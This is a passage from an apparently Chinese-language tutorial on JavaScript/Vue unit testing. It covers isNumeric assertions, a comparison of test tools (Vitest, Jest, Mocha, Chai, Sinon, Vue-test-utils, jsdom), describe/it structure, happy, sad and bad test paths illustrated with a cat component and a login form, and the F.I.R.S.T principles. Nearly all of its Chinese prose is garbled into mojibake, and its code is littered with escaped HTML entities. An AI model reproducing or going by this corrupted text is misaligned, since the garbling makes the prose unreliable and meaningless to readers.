trueï¼Œå³ç‚ºé€šéæ¸¬è©¦ expect(isNumeric(\u0026#39;100\u0026#39;)).toBe(true) // trueï¼Œå³ç‚ºé€šéæ¸¬è©¦ expect(isNumeric(null)).toBe(false) // trueï¼Œå³ç‚ºé€šéæ¸¬è©¦ expect(isNumeric(NaN)).toBe(false) // trueï¼Œå³ç‚ºé€šéæ¸¬è©¦ å®Œæˆï¼ç¾åœ¨å·²ç¶“ä¸æœƒé¡¯ç¤ºæ¸¬è©¦å¤±æ•—çš„è¨Šæ¯äº†ï¼Œä¹Ÿå°±è¡¨ç¤º isNumeric æ–¹æ³•ç¬¦åˆæˆ‘å€‘çš„é æœŸå›‰ã€‚\nè€Œç¾åœ¨å‡ä½¿æˆ‘æƒ³ä½¿å¯¦ä½œç¨‹å¼ç¢¼çš„éƒ¨åˆ†æ›´åŠ çš„å®Œå–„ï¼Œåªè¦å¢åŠ åˆé©çš„æ¸¬è©¦æ¡ˆä¾‹é€²å»å°±å¯ä»¥å¢æ·»å—æ¸¬ç‰©æœ¬èº«çš„ä¿¡è³´èˆ‡ç©©å®šåº¦ï¼š\n1 2 3 4 5 6 7 expect(isNumeric(1)).toBe(true) expect(isNumeric(1.123)).toBe(true) expect(isNumeric(0xFFF)).toBe(true) expect(isNumeric(\u0026#39;100\u0026#39;)).toBe(true) expect(isNumeric(undefined)).toBe(false) expect(isNumeric(null)).toBe(false) expect(isNumeric(NaN)).toBe(false) ç”šè‡³å°‡ä¾†æ”¹å¯«å¯¦ä½œ(isNumeric)çš„æ™‚å€™ï¼Œæ—¢æœ‰çš„æ¸¬è©¦å…§å®¹å°±æœƒæé†’ä½ æ˜¯å¦é•åäº†ä¹‹å‰æ‰€å¯«çš„æ¸¬è©¦æ¡ˆä¾‹ã€‚\næ¸¬è©¦å·¥å…·çš„é¸æ“‡ ä¸Šé¢æœ‰æåˆ°ç°¡æ˜“çš„æ¸¬è©¦å·¥å…·æ˜¯å¦‚ä½•æ‰‹åˆ»å‡ºä¾†çš„ï¼Œä¹Ÿç¨å¾®è«‡åˆ°äº†æ‰‹åˆ»æ¸¬è©¦å·¥å…·çš„å›°é›£ï¼Œå› æ­¤é¸æ“‡ä¸€å€‹é©ç•¶çš„æ¸¬è©¦å·¥å…·ä¾†è¼”åŠ©æˆ‘å€‘é€²è¡Œæ¸¬è©¦æ˜¯æœ‰å¿…è¦æ€§çš„ã€‚\nä½†æ¸¬è©¦å·¥å…·ç™¾ç™¾ç¨®ï¼Œè¨±å¤šå·¥å…·åœ¨æä¾›çš„åŠŸèƒ½ä¸Šåˆé‡ç–Šï¼Œé‚£éº¼æˆ‘å€‘è©²å¦‚ä½•é¸æ“‡å·¥å…·å‘¢ï¼Ÿ\nè‹¥æ˜¯ä»¥ã€Œå–®å…ƒæ¸¬è©¦ã€ä¾†èªªçš„è©±ï¼Œæˆ‘å€‘åœ¨æ’°å¯«æ¸¬è©¦ç¨‹å¼ç¢¼æ™‚å¯èƒ½è‡³å°‘å°±æœƒæœ‰ä»¥ä¸‹çš„éœ€æ±‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* å¼•å…¥ç›¸é—œæª”æ¡ˆ */ describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒæè¿°\u0026#39;, () =\u0026gt; { it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹æè¿°\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.text()).toBe(\u0026#39;Hello, World\u0026#39;) }) it(\u0026#39;å¦ä¸€å€‹æ¸¬è©¦æ¡ˆä¾‹æè¿°\u0026#39;, () =\u0026gt; { const wrapper = mount(component, { props: { content: \u0026#39;Unit-test!\u0026#39; } }) expect(wrapper.text()).toBe(\u0026#39;Unit-test!\u0026#39;) }) }) æ¸¬è©¦ç’°å¢ƒ(test runner)ï¼šæä¾›ä¸Šæ–¹æ¸¬è©¦ç¨‹å¼ç¢¼åŸ·è¡Œçš„ç’°å¢ƒã€‚ æ¸¬è©¦æƒ…å¢ƒ(test suite)ï¼šå¦‚ä¸Šæ–¹çš„ describeï¼Œç”¨ä¾†åŒ…è£¹å¤šå€‹æ¸¬è©¦æ¡ˆä¾‹ï¼Œä»¥åŠæè¿°æ¸¬è©¦æƒ…å¢ƒâ‹¯â‹¯ç­‰åŠŸèƒ½ã€‚ æ¸¬è©¦æ¡ˆä¾‹(test case)ï¼šå¦‚ä¸Šæ–¹çš„ itï¼Œç”¨ä¾†åŒ…è£¹è©²æ¸¬è©¦æ¡ˆä¾‹çš„å¯¦éš›æƒ…æ³ï¼Œè‹¥æœ‰éŒ¯èª¤æ™‚éœ€è®“æˆ‘å€‘èƒ½å¤ è¼•æ˜“æ‰¾åˆ°æ˜¯å“ªå€‹æ¡ˆä¾‹ç™¼ç”Ÿçš„â‹¯â‹¯ç­‰ç­‰åŠŸèƒ½ã€‚ æ–·è¨€(Assertion)ï¼šå¦‚ä¸Šæ–¹çš„ expectï¼Œä¸»è¦æ˜¯ç”¨ä¾†åˆ¤æ–·å—æ¸¬ç‰©èˆ‡é æœŸçµæœæ˜¯å¦ä¸€è‡´çš„æ–¹æ³•ï¼Œç”šè‡³ä¾æ“šä¸åŒåˆ¤æ–·æ–¹å¼å…§éƒ¨ä¹Ÿæä¾›äº†å¤šç¨®åˆ¤æ–·æ–¹å¼ï¼Œå¦‚ .toBe å¯ç”¨ä¾†åˆ¤æ–·é¸å–çš„ç›®æ¨™èˆ‡é æœŸçµæœæ˜¯å¦ç›¸ç­‰ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨å¿…è¦çš„æƒ…æ³ä¸‹ç”šè‡³æœƒéœ€è¦ï¼š\næ¸¬è©¦æ›¿èº«(test double)ï¼šç”¨ä¾†æ¨¡ä»¿ä¾è³´å·¥å…·æˆ–å‡½å¼åŸå…ˆçš„åŠŸèƒ½ç‹€æ³ è§£ææˆ–æ¨¡æ“¬å…ƒä»¶å®¹å™¨ æ¨¡æ“¬ç€è¦½å™¨ä¸­ DOM çš„ç’°å¢ƒ è€Œæ ¹æ“šä¸Šè¿°éœ€æ±‚ï¼Œå°±èƒ½å¤ åˆ—å‡ºä¸€å€‹éœ€æ±‚è¡¨ï¼Œä¾†è©•ä¼°å„å€‹æ¸¬è©¦å·¥å…·æ˜¯å¦ç¬¦åˆæˆ‘å€‘æ¸¬è©¦éœ€è¦çš„éƒ¨åˆ†ï¼š\næ¸¬è©¦å·¥å…·åˆ—è¡¨å¯åƒè€ƒå€‹æ¡†æ¶ä¸­çš„æ¸¬è©¦å»ºè­°æŒ‡å—ï¼Œæ¯”æ–¹ Vue çš„æ¸¬è©¦å»ºè­°æŒ‡å—\néœ€æ±‚ Vitest Jest Mocha Chai.js Sinon.js Vue-test-utils jsdom æ¸¬è©¦ç’°å¢ƒ(test runner) âœ”(è¨»1) âœ” âœ” æ¸¬è©¦æƒ…å¢ƒ(test suite) âœ” âœ” âœ” æ¸¬è©¦æ¡ˆä¾‹(test case) âœ” âœ” âœ” æ–·è¨€(Assertion) âœ” âœ” âœ” æ¸¬è©¦æ›¿èº«(test double) âœ” âœ” âœ” è§£ææˆ–æ¨¡æ“¬å…ƒä»¶å®¹å™¨ âœ” æä¾›æ¨¡æ“¬ DOM ç’°å¢ƒ âœ” è¨»1ï¼šVitest æœ¬èº«åŸºæ–¼ Vite ç’°å¢ƒï¼Œå› æ­¤å°ˆæ¡ˆè‹¥éé€é Vite æ‰€æ§‹å»ºçš„è©±å°±ç„¡æ³•ä½¿ç”¨ã€‚\nç¾åœ¨é€éé€™å€‹è¡¨æˆ‘å€‘å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹è¦‹ï¼Œå‡è¨­å°ˆæ¡ˆæ˜¯åŸºæ–¼ Vite æ‰€å»ºç«‹çš„é‚£éº¼æˆ‘å¯ä»¥é¸æ“‡ä¸‹åˆ—é€™å€‹çµ„åˆï¼š\nVitest + Vue-test-utils + jsdom å¦‚æœå°ˆæ¡ˆæ˜¯åŸºæ–¼ Vue-cli æ‰€å»ºç«‹çš„ï¼Œé‚£éº¼å°±ç„¡æ³•ä½¿ç”¨äº† Vitest ä½œç‚ºæ¸¬è©¦é‹è¡Œçš„ç’°å¢ƒäº†ï¼Œæ­¤æ™‚æ ¹æ“šè¡¨ä¸­æˆ‘å€‘å°±å¯ä»¥æ›¿æ›ç‚ºï¼š\næ–¹æ¡ˆä¸€ï¼šJest + Vue-test-utils + jsdom æ–¹æ¡ˆäºŒï¼šMocha + Chai.js + Sinon.js + Vue-test-utils + jsdom è€Œåœ¨åšå·¥å…·æ›¿æ›æ™‚ï¼Œéœ€è¦æ³¨æ„åˆ°çš„æ˜¯ï¼Œä¸åŒçš„æ¸¬è©¦ç’°å¢ƒ(test runner)å¯èƒ½æœƒå°æ–¼å¼•å…¥(import)æª”æ¡ˆæ™‚ç™¼ç”Ÿè§£æä¸Šçš„å•é¡Œï¼Œæ¯”æ–¹è‹¥ç”¨åˆ° Vue ä¸­çš„ SFC é¡å‹æª”æ¡ˆä½œç‚ºé–‹ç™¼ï¼Œé‚£åœ¨ Jest åšç‚ºæ¸¬è©¦ç’°å¢ƒæ™‚æˆ‘å€‘å°±éœ€è¦å¦å¤–å®‰è£ vue-jest ä¾†åšè½‰æ› SFC ä¸Šçš„è™•ç†ã€‚\nç•¶ç„¶ï¼Œä¸Šè¿°çš„éœ€æ±‚è¡¨åªæ˜¯ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œè€Œéš¨è‘—æ’°å¯«æ¸¬è©¦çš„ç¶“é©—è¶Šå¤šï¼Œå¾ŒçºŒæ…¢æ…¢å°±æœƒç­è§£åˆ°å°ˆæ¡ˆä¸­æœƒéœ€è¦å“ªäº›æ¸¬è©¦å·¥å…·ä¾†å”åŠ©æˆ‘å€‘é€²è¡Œæ¸¬è©¦ï¼Œç”šè‡³æ¯”è¼ƒå„ç¨®æ¸¬è©¦å·¥å…·çš„å„ªç¼ºé»å¾è€Œé¸å‡ºæœ€é©åˆåœ˜éšŠçš„æ¸¬è©¦å·¥å…·ï¼\nç¾åœ¨æˆ‘å€‘å·²ç¶“äº†è§£è¦å¦‚ä½•æŒ‘é¸æ¸¬è©¦å·¥å…·äº†ï¼Œæ¥ä¸‹ä¾†è¦é–‹å§‹èŠèŠæ’°å¯«æ¸¬è©¦æ¡ˆä¾‹æ™‚æ‡‰è©²è¦å¦‚ä½•æ€è€ƒï¼\næ±ºå®šæ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹ å†ä¾†è«‡è«‡åœ¨é¸æ“‡é€™äº›å·¥å…·å¾Œï¼Œæˆ‘å€‘è¦å¦‚ä½•ä¾†æ€è€ƒé‡å°ã€Œå–®å…ƒæ¸¬è©¦ã€çš„éƒ¨åˆ†ï¼Œæ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹è¦æ€éº¼æ’°å¯«ä»¥åŠéœ€è¦æ³¨æ„çš„åœ°æ–¹ã€‚\næ¸¬è©¦æƒ…å¢ƒ(test suite)æ¸¬è©¦æ¡ˆä¾‹(test case) æä¾›æ¸¬è©¦ç’°å¢ƒçš„å·¥å…·ä¸€èˆ¬æœƒçµ¦äºˆæ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹çš„ç›¸é—œ APIï¼Œè€Œæ¸¬è©¦æƒ…å¢ƒèˆ‡æ¡ˆä¾‹æœ€ä¸»è¦çš„ç”¨æ„æ˜¯ç”¨ä¾†å¹«åŠ©æˆ‘å€‘è¦åŠƒèˆ‡æ•´ç†æ•´å€‹æ¸¬è©¦é‚è¼¯ï¼Œä¸¦ä¸”åœ¨æˆ‘å€‘æ¸¬è©¦æ¡ˆä¾‹éŒ¯èª¤çš„æ™‚å€™åŒæ™‚æä¾›ç›¸å°æ‡‰çš„è³‡è¨Šã€‚\næ¥ä¸‹ä¾†æˆ‘å€‘ä»¥ã€Œè²“å’ªä½œç‚ºå…ƒä»¶ã€ç‚ºæ•…äº‹ä¸»è»¸ä¾†è«‡è«‡å–®å…ƒæ¸¬è©¦çš„æ€è·¯æœƒæ˜¯æ€éº¼æ’°å¯«ã€‚\né¦–å…ˆæˆ‘å€‘å‡è¨­ã€Œè²“å’ªã€å…ƒä»¶æœƒæä¾›ä¸‹åˆ—åŠŸèƒ½ï¼š\nç™¼å‡ºå‘¼åš•åš•å«è² æ¨å€’çœ¼å‰çœ‹åˆ°çš„æ‰€æœ‰æ±è¥¿ è€Œä»¥ä½¿ç”¨è€…è§’åº¦ä¸Šä¾†çœ‹ï¼Œæˆ‘å€‘æœƒå°ã€Œè²“å’ªã€åšå‡ºé€™äº›äº‹æƒ…ï¼š\næ‘¸æ‘¸ é¤µé£Ÿ æ‹¿ç©å…·é€— æ¥è‘—æˆ‘å€‘å°±å¯ä»¥ä»¥å…ƒä»¶ä½œç‚ºæƒ…å¢ƒä¾†å®šç¾©å‡ºå„ç¨®ä½¿ç”¨ä¸Šçš„æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;è²“å’ª\u0026#39;, () =\u0026gt; { it(\u0026#39;æ‘¸æ‘¸ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;é¤µé£Ÿï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;æ‹¿ç©å…·é€—ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;ä»€éº¼éƒ½ä¸åšï¼Œæ‡‰è©²æ¨å€’çœ¼å‰çœ‹åˆ°çš„æ‰€æœ‰æ±è¥¿\u0026#39;, () =\u0026gt; { // ... }) }) ä½†çœŸå¯¦çš„æ¸¬è©¦æ¡ˆä¾‹ä¸æœƒé€™éº¼ç°¡å–®ï¼Œç¸½æœƒæœ‰ä¸€äº›ä¾‹å¤–ç‹€æ³ï¼Œé‚£éº¼æ¸¬è©¦æ¡ˆä¾‹æ‡‰è©²è¦åŒ…å«å“ªäº›è¦ç´ æ¯”è¼ƒå¥½ï¼Ÿ\næ¡ˆä¾‹è·¯å¾‘(happy pathã€sad pathã€bad path) åœ¨è¨­å®šæ¸¬è©¦æ¡ˆä¾‹æ™‚ï¼Œç¸½æœƒæœ‰ç™¾ç™¾ç¨®æƒ…æ³ï¼Œä½†æ˜¯æˆ‘å€‘ä¸å¯èƒ½æ¯å€‹éƒ½å¯«å‡ºä¾†ï¼Œè€Œæ ¹æ“šæ¸¬è©¦æ¡ˆä¾‹çš„é¡å‹ä¸»è¦å¯ä»¥åˆ†ç‚ºä¸‰ç¨®è·¯å¾‘ï¼š\nHappy Pathï¼šåœ¨æˆ‘å€‘å®šç¾©æ‰€è¬‚ã€Œæ­£å¸¸çš„ä½¿ç”¨ç‹€æ³ã€ä¸‹ï¼Œé‡å°ã€Œæ­£ç¢ºçš„å…§å®¹ã€ï¼Œæˆ‘å€‘é æœŸæ‡‰è©²è¦åšå‡ºçš„åæ‡‰ã€‚ Sad Pathï¼šåœ¨æˆ‘å€‘å®šç¾©æ‰€è¬‚ã€Œæ­£å¸¸çš„ä½¿ç”¨ç‹€æ³ã€ä¸‹ï¼Œé‡å°ã€ŒéŒ¯èª¤çš„å…§å®¹ã€ï¼Œæˆ‘å€‘é æœŸæ‡‰è©²è¦åšå‡ºçš„åæ‡‰ã€‚ Bad Pathï¼šåœ¨æˆ‘å€‘å®šç¾©æ‰€è¬‚ã€ŒéŒ¯èª¤ã€çš„ä½¿ç”¨ç‹€æ³ä¸‹ï¼Œæˆ‘å€‘é æœŸæ‡‰è©²è¦åšå‡ºçš„åæ‡‰ã€‚ åŒæ¨£ä»¥è²“è¢«æ‘¸æ‘¸ä½œç‚ºä¾‹å­ä¾†çœ‹ï¼Œå‡è¨­å°æ–¼è²“ä¾†èªªèƒ½å¤ æ¥å—æ‘¸æ‘¸çš„æƒ…æ³åªé™æ–¼ã€Œé ­èˆ‡ä¸‹å·´ã€ï¼Œè€Œå–œæ­¡è¢«æ‘¸çš„éƒ¨åˆ†åªæœ‰ã€Œä¸‹å·´ã€ï¼Œé‚£éº¼æ¸¬è©¦æ¡ˆä¾‹è·¯å¾‘å°±å¯ä»¥é€™éº¼å®šç¾©ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;è²“å’ª\u0026#39;, () =\u0026gt; { // Happy Path it(\u0026#39;æ‘¸æ‘¸ä¸‹å·´ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // ... }) // Sad Path it(\u0026#39;æ‘¸æ‘¸é ­ï¼Œæ‡‰è©²æ²’åæ‡‰\u0026#39;, () =\u0026gt; { // ... }) // Bad Path it(\u0026#39;æ‘¸æ‘¸è‚šå­ï¼Œæ‡‰è©²æ‹‹å‡ºéŒ¯èª¤\u0026#39;, () =\u0026gt; { // ... }) }) è·¯å¾‘å„ªå…ˆåº¦ è€Œä»¥å„å€‹è·¯å¾‘å„ªå…ˆåº¦ä¾†èªªï¼Œæˆ‘å€‘æ‡‰ç•¶ç›¡å¯èƒ½çš„å…ˆå®Œå–„ Happy Path èˆ‡ Sad Path çš„å„ç¨®æ¡ˆä¾‹ï¼Œå› ç‚ºå°æ–¼å¯¦éš›å°ˆæ¡ˆä¸Šä¾†èªªï¼Œé€™äº›å…§å®¹æ˜¯æˆ‘å€‘é æœŸå…ƒä»¶æˆ–å‡½å¼æœ¬èº«æ‡‰æä¾›çš„å…§å®¹ã€‚\nç„¶è€Œ Bad Path é€šå¸¸æ˜¯å»ºç«‹å·²çŸ¥å“ªäº›æƒ…æ³æœƒæ˜¯ã€Œä¸æ­£ç¢ºçš„ä½¿ç”¨ã€ï¼Œæˆ‘å€‘åªèƒ½å°±å·²çŸ¥çš„ç‹€æ³ä¾†é é˜²ã€‚ç„¶è€Œï¼Œé€™ä¸€éƒ¨åˆ†å…¶å¯¦å†æ€éº¼ç¸å¯†ï¼Œéƒ½é‚„æ˜¯æœƒæœ‰æ¥µå…¶ä¾‹å¤–çš„äº‹æƒ…ç™¼ç”Ÿï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 describe(\u0026#39;è²“å’ª\u0026#39;, () =\u0026gt; { // ... // Bad Path it(\u0026#39;æ‘¸æ‘¸è‚šå­ï¼Œæ‡‰è©²æ‹‹å‡ºéŒ¯èª¤\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;æ‘¸æ‘¸å°¾å·´ï¼Œæ‡‰è©²æ‹‹å‡ºéŒ¯èª¤\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;æ‘¸æ‘¸æ‰‹ï¼Œæ‡‰è©²æ‹‹å‡ºéŒ¯èª¤\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;æ‘¸æ‘¸è…³ï¼Œæ‡‰è©²æ‹‹å‡ºéŒ¯èª¤\u0026#39;, () =\u0026gt; { // ... }) // èˆ‰ä¸å®Œ }) å› æ­¤é€éæ¸¬è©¦ä¾†ä½œé˜²ç¦¦æ‰€æœ‰ä¸åˆç†çš„è¡Œç‚ºæ˜¯ä¸æ²»æœ¬çš„è¡Œç‚ºï¼Œæˆ‘æ‡‰è©²å¾å—æ¸¬ç‰©æœ¬èº«æä¾›çš„æ“ä½œæˆ–æ˜¯ç”¢å“è¦åŠƒä¸Šä¾†å»è€ƒé‡ç›¸å°æ²»æœ¬çš„æ–¹å¼ï¼›æ¯”æ–¹åœ¨ã€Œè²“å’ªã€å…ƒä»¶ä¸Šé€éç¨‹å¼è¨­è¨ˆçš„éƒ¨åˆ†ï¼Œè¦åŠƒã€Œæ‘¸æ‘¸ã€è¡Œç‚ºåªé–‹æ”¾ã€Œ**é ­ã€**èˆ‡ã€Œä¸‹å·´ã€çš„éƒ¨ä½ï¼Œå¾é–‹ç™¼éšæ®µå°±é˜»æ­¢å…¶ä»–é–‹ç™¼è€…èª¤ç”¨ã€Œæ‘¸æ‘¸ã€æ–¹æ³•ï¼Œåˆ°æœ€å¾ŒçœŸçš„æœ‰å…¶å¿…è¦ç‰¹åˆ¥æ‹‹å‡ºæ™‚æ‰é‡å°é€™ä¸€éƒ¨åˆ†å¯« Bad Path æ¡ˆä¾‹ã€‚\næœ€å¾Œï¼Œå†ç”¨ä¸€å€‹å¯¦éš›ä¸€é»çš„ä¾‹å­èªªæ˜ï¼Œå‡è¨­ä»Šå¤©æœ‰å€‹ç™»å…¥çš„è¡¨å–®å…ƒä»¶ï¼Œé‚£éº¼æœ€ç°¡å–®é æœŸæœƒæœ‰çš„æ¡ˆä¾‹å°±æœƒæ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 describe(\u0026#39;ç™»å…¥å…ƒä»¶\u0026#39;, () =\u0026gt; { // Happy Path it(\u0026#39;è¼¸å…¥æ­£ç¢ºå¸³è™Ÿå¯†ç¢¼ï¼Œæ‡‰ç™»å…¥åˆ°ï¼¯ï¼¯é é¢\u0026#39;, () =\u0026gt; { // ... }) // Sad Path it(\u0026#39;åªè¼¸å…¥å¸³è™Ÿï¼Œæ‡‰è©²é¡¯ç¤ºè«‹è¼¸å…¥å¯†ç¢¼\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;åªè¼¸å…¥å¯†ç¢¼ï¼Œæ‡‰è©²é¡¯ç¤ºè«‹è¼¸å…¥å¸³è™Ÿ\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;è¼¸å…¥éŒ¯èª¤å¸³è™Ÿå¯†ç¢¼ï¼Œæ‡‰è©²é¡¯ç¤ºç™»å…¥è³‡è¨ŠéŒ¯èª¤\u0026#39;, () =\u0026gt; { // ... }) }) ä»¥ä¸Šå°±æ˜¯æ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹æœ€åŸºæœ¬éœ€è¦ç­è§£çš„éƒ¨åˆ†ï¼Œæ¥è‘—æˆ‘å€‘ä¾†é—œæ³¨æ–¼æ¸¬è©¦æ¡ˆä¾‹ä¸­å…§éƒ¨æ‡‰è©²è¦å¦‚ä½•ä¾†æ’°å¯«ã€‚\næ’°å¯«æ¸¬è©¦ç¨‹å¼ç¢¼çš„å‰è¨€ æ’°å¯«æ¸¬è©¦ç¨‹å¼ç¢¼éœ€ä¿æŒçš„å¿ƒå¢ƒ è«‡åˆ°æ’°å¯«æ¸¬è©¦ï¼Œä¸å¾—ä¸æåˆ° Robert Cecil Martin æœ‰æœ¬ç¶“å…¸çš„ã€Šç„¡ç‘•çš„ç¨‹å¼ç¢¼ï¼šæ•æ·è»Ÿé«”é–‹ç™¼æŠ€å·§å®ˆå‰‡ã€‹ï¼Œä½œè€…åœ¨å…¶ä¸­é‡å°äº†ç¨‹å¼ç¢¼çš„éƒ¨åˆ†æäº†å¾ˆå¤šå„ªè‰¯çš„å»ºè­°ï¼Œä¸è«–æ˜¯æ’°å¯«ç¨‹å¼ç¢¼ä¸­çš„å‘½åã€å‡½å¼åƒæ•¸ç­‰ç­‰åšæ¢è¨ï¼Œä¹Ÿåœ¨å¯¦éš›çš„æ¡ˆä¾‹ä¸­åšä¸€äº›è¨è«–èˆ‡é‡æ§‹ï¼Œæœ€å¾Œå›é¡§é‚£äº›ç¨‹å¼ç¢¼ä¸­çš„æ°£å‘³ã€æ¸…ç†ç¨‹å¼ç¢¼ï¼Œä¸€æ°£å‘µæˆã€‚\nè€Œå…¶ä¸­æœ‰ä¸€å€‹ç« ç¯€æœ€ä¸»è¦å°±æ˜¯åœ¨è¬›æœ‰é—œã€Œå–®å…ƒæ¸¬è©¦ã€çš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ç³»åˆ—æ–‡å‰è¨€æåˆ°ã€Œè¢«æ¨å‘ã€çš„éƒ¨åˆ†ï¼Œæˆ‘æŠŠè£¡é¢çš„æ¦‚å¿µçµåˆæˆ‘çš„ç¶“é©—ä¾†é‡æ–°é—¡è¿°ä¸€æ¬¡ï¼š\nè‹¥å¸¶è‘—å–®ç´”å­¸ç¿’çš„å¿ƒæ…‹ä¾†çœ‹å¾…æ¸¬è©¦ç¨‹å¼ç¢¼ï¼Œå…¶å¯¦å¾ˆå®¹æ˜“æŠŠå®ƒç•¶ä½œä¸€é …è¼”åŠ©å·¥å…·åœ¨è™•ç†ï¼Œè¦ºå¾—æ²’æœ‰ä¹Ÿæ²’ä»€éº¼é—œä¿‚ï¼Œç”šè‡³ç¤™æ‰‹ç¤™è…³çš„ï¼Œç”šè‡³å¯èƒ½è¦ºå¾—é‚„è¦ç‰¹åœ°èŠ±äº†ä¸å°‘å¿ƒåŠ›ä¾†ç­è§£å®ƒï¼Œä½†é€™æ˜¯ä¸€é«”å…©é¢çš„ã€‚\nè‹¥ä½ æŠŠå®ƒç•¶ä½œç”¢å“ä¸­çš„ä¸€éƒ¨åˆ†å°±æœƒç™¼ç¾ï¼Œé›–ç„¶é–‹ç™¼æ™‚æœƒå—åˆ°æ¸¬è©¦ç¨‹å¼ç¢¼çš„ã€Œé™åˆ¶ã€ï¼Œä½†åŒæ™‚ä»–å…¶å¯¦ä¹Ÿæ˜¯åœ¨åšã€Œå®ˆè­·ã€ç”¢å“ç¨‹å¼ç¢¼é€™ä»¶äº‹æƒ…ï¼›ç”šè‡³å› ç‚ºæœ‰äº†ã€Œå¯ä¿¡è³´çš„æ¸¬è©¦ã€ï¼Œæ‰€ä»¥ç•¶æˆ‘å€‘åœ¨é€²è¡Œã€Œé‡æ§‹ã€ç­‰ç­‰èª¿æ•´æ™‚ä¹Ÿæ‰èƒ½æ›´æœ‰ä¿¡å¿ƒåœ°å»è™•ç†ã€‚\nå› æ­¤åªè¦ç¢ºä¿æˆ‘å€‘åœ¨é©ç•¶çš„æ™‚æ©ŸåŠ å…¥å®ƒï¼Œé‚£éº¼å®ƒå°±èƒ½å¤ å¸¶ä¾†å¯è§€çš„å¾ŒçºŒæ•ˆç›Šï¼Œè€Œæ—¢ç„¶ä»–èƒ½å¤ æ›¿æˆ‘å€‘å¸¶ä¾†æ•ˆç›Šï¼Œé‚£æˆ‘å€‘å°å¾…æ¸¬è©¦ç¨‹å¼ç¢¼çš„æ…‹åº¦å…¶å¯¦ä¹Ÿæ‡‰è©²è¦åŒç†ç”¢å“ç¨‹å¼ç¢¼ï¼Œå¯æ˜¯é™¤äº†è®“æ¸¬è©¦ç¨‹å¼ç¢¼å¦‚åŒç”¢å“ç¨‹å¼ç¢¼ä¸€æ¨£ä¿æŒã€Œæ•´æ½”ã€èˆ‡ã€Œå¯è®€æ€§ã€ä¹‹å¤–ï¼Œæˆ‘å€‘é‚„æœ‰ä»€éº¼è¾¦æ³•å‘¢ï¼Ÿ\nå°æ–¼é€™å€‹å•é¡Œ Martin çµ¦äº†ä¸€å€‹æ’°å¯«æ¸¬è©¦ç¢¼çš„å„ªè‰¯æº–å‰‡ï¼Œé‚£å°±æ˜¯ F.I.R.S.T æ³•å‰‡ã€‚\nF.I.R.S.T æ³•å‰‡ F.I.R.S.T æ³•å‰‡é¡§åæ€ç¾©å…¶å¯¦å°±æ˜¯äº”å€‹è‹±æ–‡å–®å­—çš„ç¸®å¯«ï¼Œä»–å€‘åˆ†åˆ¥æ˜¯ï¼š\nFast Independent Repeatable Self-Validating Timely Fast(å¿«) ç°¡å–®ä¾†èªªå°±æ˜¯å¿«ï¼Œå› ç‚ºå¿«æ‰èƒ½è®“æˆ‘å€‘å¿«é€Ÿé‡è¤‡å¤§é‡åœ°æª¢é©—ç”¢å“ç¨‹å¼ç¢¼ï¼›é€™æ„å‘³è‘—æˆ‘å€‘åœ¨æ¸¬è©¦ç¨‹å¼ç¢¼ä¸­æœ‰å¯èƒ½æœƒé‡åˆ°è¦ call API çš„æƒ…æ³ï¼Œé‚£éº¼æˆ‘å€‘å¯ä»¥å°‡å…¶éš”é›¢ä¸¦ç«‹åˆ»å›å‚³æˆ‘å€‘é å®šå¥½çš„è³‡æ–™ä¾†æ¸›å°‘ç­‰å¾…å›æ‡‰çš„æ™‚é–“ã€‚\nIndependent(ç¨ç«‹) å¦‚æˆ‘å€‘ä¸Šä¸€ç¯‡æ–‡ç« æ‰€æåˆ°çš„ï¼Œæ¯å€‹æ¸¬è©¦æ¡ˆä¾‹æ‡‰è©²è¦äº’ç›¸ç¨ç«‹ï¼Œå½¼æ­¤ä¸å—å¹²æ“¾ä¹‹å¤–ï¼Œç”šè‡³é€£åŸ·è¡Œé †åºä¸Šéƒ½ä¸æœƒå½±éŸ¿åˆ°æœ€çµ‚çµæœã€‚\nRepeatable(å¯é‡è¤‡) å¯é‡è¤‡æ€§ä¸»è¦æçš„å°±æ˜¯ä¸è«–åœ¨ä»€éº¼è¨­å‚™ç‹€æ³ä¸‹ï¼Œæ‡‰è©²éƒ½è¦ä¿æŒè‘—ä¸€è‡´çš„çµæœï¼Œé€™æ¨£æˆ‘å€‘æ‰èƒ½æ’é™¤æ‰å…¶ä»–ä¸å¿…è¦çš„åŸå› ï¼Œå°ˆæ³¨åœ¨ç™¼ç”Ÿå•é¡Œçš„ç¨‹å¼ç¢¼ä¸Šã€‚\nSelf-Validating(èƒ½è‡ªæˆ‘é©—è­‰) æ¸¬è©¦çš„æœ€çµ‚ç‹€æ…‹æ‡‰è©²è¦èƒ½å¤ 